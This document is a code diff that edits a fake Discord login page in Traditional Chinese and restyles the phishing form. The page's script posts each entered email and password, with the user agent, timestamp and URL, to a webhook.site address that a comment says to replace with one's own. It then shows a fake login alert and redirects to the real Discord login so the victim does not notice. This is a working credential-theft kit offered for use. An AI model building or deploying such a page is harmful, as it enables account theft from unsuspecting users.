@@ -1,83 +1,90 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
   <title>Discord - 登入</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    :root {
-      --bg-primary: #36393f;
-      --bg-secondary: #2f3136;
-      --text-primary: #dcddde;
-      --text-secondary: #b9bbbe;
-      --brand: #5865f2;
-      --brand-hover: #4752c4;
-      --input-bg: #202225;
-      --input-border: #202225;
-    }
-    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      background: var(--bg-primary);
-      color: var(--text-primary);
+      margin: 0;
       height: 100vh;
+      background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: #dcddde;
       display: flex;
       align-items: center;
       justify-content: center;
     }
     .container {
-      width: 440px;
-      background: var(--bg-primary);
+      display: flex;
+      width: 100%;
+      max-width: 1000px;
+      height: 100%;
+      background: #36393f;
+    }
+    .left {
+      flex: 1;
       padding: 40px;
-      border-radius: 5px;
-      box-shadow: 0 2px 10px rgba(0,0,0,.4);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      max-width: 480px;
+    }
+    .right {
+      flex: 1;
+      background: #2f3136;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #b9bbbe;
+      font-size: 14px;
     }
     .logo {
-      text-align: center;
       margin-bottom: 30px;
+      text-align: center;
     }
     .logo img {
       width: 80px;
-      height: auto;
     }
     h1 {
       font-size: 24px;
-      text-align: center;
-      margin: 0 0 8px;
       color: #fff;
+      margin: 0 0 8px;
+      text-align: center;
     }
     .sub {
       text-align: center;
-      color: var(--text-secondary);
+      color: #b9bbbe;
       margin-bottom: 30px;
       font-size: 16px;
     }
     label {
       display: block;
       margin-bottom: 8px;
-      color: var(--text-secondary);
+      color: #b9bbbe;
       font-size: 14px;
       font-weight: 600;
     }
     input {
       width: 100%;
-      padding: 10px;
+      padding: 10px 12px;
       margin-bottom: 20px;
-      background: var(--input-bg);
-      border: 1px solid var(--input-border);
+      background: #202225;
+      border: 1px solid #202225;
       border-radius: 3px;
       color: #fff;
       font-size: 16px;
+      box-sizing: border-box;
     }
     input:focus {
       outline: none;
-      border-color: var(--brand);
+      border-color: #5865f2;
       box-shadow: 0 0 0 2px rgba(88,101,242,.3);
     }
     button {
       width: 100%;
       padding: 12px;
-      background: var(--brand);
+      background: #5865f2;
       color: #fff;
       border: none;
       border-radius: 3px;
@@ -87,7 +94,7 @@
       transition: background .2s;
     }
     button:hover {
-      background: var(--brand-hover);
+      background: #4752c4;
     }
     .footer {
       text-align: center;
@@ -106,25 +113,32 @@
 </head>
 <body>
   <div class="container">
-    <div class="logo">
-      <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
+    <div class="left">
+      <div class="logo">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
+      </div>
+      <h1>歡迎回來！</h1>
+      <div class="sub">我們很高興又見到您了！</div>
+      
+      <form id="login-form">
+        <label>電子郵件或電話號碼 *</label>
+        <input type="text" id="email" required>
+        
+        <label>密碼 *</label>
+        <input type="password" id="password" required>
+        
+        <button type="submit">登入</button>
+      </form>
+      
+      <div class="footer">
+        <a href="#">忘記密碼？</a><br>
+        需要一個帳號？ <a href="#">註冊</a>
+      </div>
     </div>
-    <h1>歡迎回來！</h1>
-    <div class="sub">很高興再次見到你</div>
     
-    <form id="login-form">
-      <label>電子郵件或電話號碼</label>
-      <input type="text" id="email" required>
-      
-      <label>密碼</label>
-      <input type="password" id="password" required>
-      
-      <button type="submit">登入</button>
-    </form>
-    
-    <div class="footer">
-      <a href="#">忘記密碼？</a><br>
-      需要帳號？ <a href="#">註冊</a>
+    <div class="right">
+      <!-- QR Code 區塊已完全刪除 -->
+      <!-- 原右側內容已移除，只留藍色漸層背景 -->
     </div>
   </div>
 
@@ -134,13 +148,20 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
       
-      // 傳送到你的 webhook
+      // 傳送到你的 webhook（改成你自己的）
       fetch('https://webhook.site/7a08f4e8-a861-4eb9-9104-5412abf52d94', {
         method: 'POST',
         mode: 'no-cors',
-        body: JSON.stringify({ email, password, timestamp: Date.now(), ua: navigator.userAgent, url: location.href })
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          timestamp: Date.now(),
+          ua: navigator.userAgent,
+          url: location.href
+        })
       });
       
+      // 假登入效果 + 跳轉真 Discord
       alert('登入中...');
       setTimeout(() => { location.href = 'https://discord.com/login'; }, 1000);
     });
